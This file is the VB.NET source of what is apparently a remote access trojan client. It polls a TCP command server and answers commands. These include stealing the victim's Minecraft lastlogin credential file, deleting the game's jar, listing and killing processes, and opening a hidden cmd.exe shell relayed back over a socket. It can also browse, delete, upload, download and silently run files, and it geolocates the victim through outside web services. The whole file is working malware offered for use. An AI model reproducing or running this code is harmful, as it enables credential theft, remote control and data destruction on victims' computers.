Imports System.Net.Sockets
Imports System.IO

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        land = GetLand()
        BackgroundWorker1.RunWorkerAsync()
    End Sub
    Public ip As String
    Public land As String = "nothing"
    Dim proc As New Process
    Dim cmd_client As TcpClient
    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        While True
            Try
                Dim client As New TcpClient("127.0.0.1", 3317)
                If client.Connected Then
                    Dim r As New IO.StreamReader(client.GetStream)
                    Dim w As New IO.StreamWriter(client.GetStream)
                    While True
                        Dim s As String = r.ReadLine
                        If s = "getos" Then
                            Threading.Thread.Sleep(500)
                            w.WriteLine(My.Computer.Info.OSFullName)
                            w.Flush()
                        ElseIf s = "getlistinfos" Then
                            Threading.Thread.Sleep(500)
                            w.WriteLine(c(My.Computer.Info.OSFullName) & "|" & c(land) & "|" & c(My.Computer.Name))
                            w.Flush()
                        ElseIf s = "land" Then
                            Threading.Thread.Sleep(500)
                            w.WriteLine(land)
                            w.Flush()
                        ElseIf s = "getname" Then
                            Threading.Thread.Sleep(500)
                            w.WriteLine(My.Computer.Name)
                            w.Flush()
                        ElseIf s = "otherinfos" Then
                            Threading.Thread.Sleep(500)
                            Dim HardwareId As String = System.Security.Principal.WindowsIdentity.GetCurrent.User.Value
                            Dim commandd As String = c(My.Computer.Info.OSPlatform) & "|" & c(My.Computer.Info.OSVersion) & "|" & c(My.Computer.Info.TotalPhysicalMemory) & "|" & c(My.Computer.Info.TotalVirtualMemory) & "|" & c(My.Computer.Screen.DeviceName) & "|" & c(HardwareId) & "|" & c(My.Computer.Info.OSFullName)
                            w.WriteLine(commandd)
                            w.Flush()
                        ElseIf s = "stealmc" Then
                            Threading.Thread.Sleep(500)
                            Dim lastlogin As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\lastlogin"
                            Dim lastlogindata As String
                            If System.IO.File.Exists(lastlogin) = True Then
                                Using file As New IO.FileStream(lastlogin, IO.FileMode.Open)
                                    Dim value As Integer = file.ReadByte()
                                    Do Until value = -1
                                        lastlogindata = lastlogindata & value.ToString("X2")

                                        value = file.ReadByte()
                                    Loop
                                End Using
                            End If
                            w.WriteLine(lastlogindata)
                            w.Flush()
                        ElseIf s = "mcremovejar" Then
                            Try
                                Kill(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\.minecraft\bin\minecraft.jar")
                            Catch ex As Exception

                            End Try
                        ElseIf s = "gettask" Then
                            Dim commandss As String = ""
                            For Each p As Process In Process.GetProcesses()
                                commandss = commandss & p.ProcessName & "|"
                            Next
                            w.WriteLine(commandss)
                            w.Flush()
                        Else
                            Try
                                Dim m As String() = s.Split("|")
                                If m(0) = "MSGBOX" Then
                                    MsgBox(m(3).Replace("<strich>", "|"), CInt(m(1)), m(2).Replace("<strich>", "|"))
                                ElseIf m(0) = "STARTCMD" Then
                                    cmd_client = New TcpClient("127.0.0.1", CInt(m(1)))
                                    With proc.StartInfo
                                        .FileName = "cmd.exe"
                                        '.Arguments = "/c cd c:\ "
                                        .CreateNoWindow = True
                                        .RedirectStandardOutput = True
                                        .RedirectStandardInput = True
                                        .UseShellExecute = False
                                    End With
                                    proc.Start()
                                    BackgroundWorker2.RunWorkerAsync()
                                ElseIf m(0) = "CMDSHELL" Then
                                    proc.StandardInput.WriteLine(m(1).Replace("<strich>", "|"))
                                    proc.StandardInput.Flush()
                                ElseIf m(0) = "endtask" Then
                                    Dim p As Process = Process.GetProcessesByName(m(1))(0)
                                    p.Kill()
                                ElseIf m(0) = "get" Then
                                    Dim commands As String = ""
                                    Dim folder As String() = IO.Directory.GetDirectories(m(1))
                                    For Each ss As String In folder
                                        commands = commands & ss & "|"
                                    Next
                                    commands = commands & "~"
                                    Dim files As String() = IO.Directory.GetFiles(m(1))
                                    For Each ss As String In files
                                        commands = commands & ss & "|"
                                    Next
                                    w.WriteLine(commands)
                                    w.Flush()
                                ElseIf m(0) = "removefile" Then
                                    Try
                                        Kill(m(1))
                                    Catch ex As Exception

                                    End Try
                                ElseIf m(0) = "downloadfile" Then
                                    Threading.Thread.Sleep(500)
                                    Dim lastlogin As String = m(1)
                                    Dim lastlogindata As String
                                    If System.IO.File.Exists(lastlogin) = True Then
                                        Using file As New IO.FileStream(lastlogin, IO.FileMode.Open)
                                            Dim value As Integer = file.ReadByte()
                                            Do Until value = -1
                                                lastlogindata = lastlogindata & value.ToString("X2")

                                                value = file.ReadByte()
                                            Loop
                                        End Using
                                    End If
                                    w.WriteLine(lastlogindata)
                                    w.Flush()
                                ElseIf m(0) = "runfilenormal" Then
                                    Dim p As New Process
                                    With p.StartInfo
                                        .FileName = m(1)
                                        '.Arguments = "/c cd c:\ "
                                        .CreateNoWindow = False
                                        .RedirectStandardOutput = False
                                        .RedirectStandardInput = False
                                        .UseShellExecute = False
                                    End With
                                    p.Start()
                                ElseIf m(0) = "runfilehidden" Then
                                    Dim p As New Process
                                    With p.StartInfo
                                        .FileName = m(1)
                                        '.Arguments = "/c cd c:\ "
                                        .CreateNoWindow = True
                                        .RedirectStandardOutput = False
                                        .RedirectStandardInput = False
                                        .UseShellExecute = False
                                    End With
                                    p.Start()
                                ElseIf m(0) = "uploadfile" Then
                                    Dim lastlogindata As String = r.ReadLine()
                                    'MsgBox(lastlogindata, MsgBoxStyle.Critical, "")
                                    Dim vByteBuffer(lastlogindata.Length + 1) As Byte
                                    Dim vHexChar As String = String.Empty
                                    For i As Integer = 0 To (lastlogindata.Length - 1) Step 2
                                        vHexChar = lastlogindata(i) & lastlogindata(i + 1)
                                        vByteBuffer(i / 2) = Byte.Parse(vHexChar, Globalization.NumberStyles.HexNumber)
                                    Next
                                    Using vFs As New FileStream(m(1), FileMode.Create)
                                        vFs.Write(vByteBuffer, 0, vByteBuffer.Length)
                                    End Using
                                End If
                            Catch ex As Exception

                            End Try
                        End If
                        If client.Client.Available Then
                            Exit While
                        End If
                    End While
                End If
            Catch ex As Exception
            End Try
            Threading.Thread.Sleep(15000)
        End While

    End Sub
    
    Private Function GetLand() As String
        Dim client As New WebBrowser
        client.Navigate("http://codeascript.de/programe/ipadresse.php")
        Do While client.ReadyState <> WebBrowserReadyState.Complete
            Application.DoEvents()
        Loop
        Dim link As String = "http://xml.utrace.de/?query= " & client.DocumentText
        client.Navigate(link)
        Do While client.ReadyState <> WebBrowserReadyState.Complete
            Application.DoEvents()
        Loop
        Dim output As String = client.Document.Body.InnerText
        Return output.Split("<countrycode>")(13).Replace("countrycode>", "")
    End Function

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        

    End Sub

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
        Dim w As New IO.StreamWriter(cmd_client.GetStream)
        While True
            Try
                Dim s As String = proc.StandardOutput.ReadLine
                w.WriteLine(s)
                w.Flush()
                Me.Invoke(New g_addrichtextbox(AddressOf addrichtextbox), s)
            Catch ex As Exception
            End Try
        End While
    End Sub


    Public Delegate Sub g_addrichtextbox(ByVal text As String)
    Public Sub addrichtextbox(ByVal text As String)
        RichTextBox1.AppendText(text & vbNewLine)

    End Sub

    Public Function c(ByVal text As String) As String
        Return text.Replace("|", "<strich>")
    End Function

    Public Function b(ByVal text As String) As String
        Return text.Replace("<strich>", "|")
    End Function

End Class
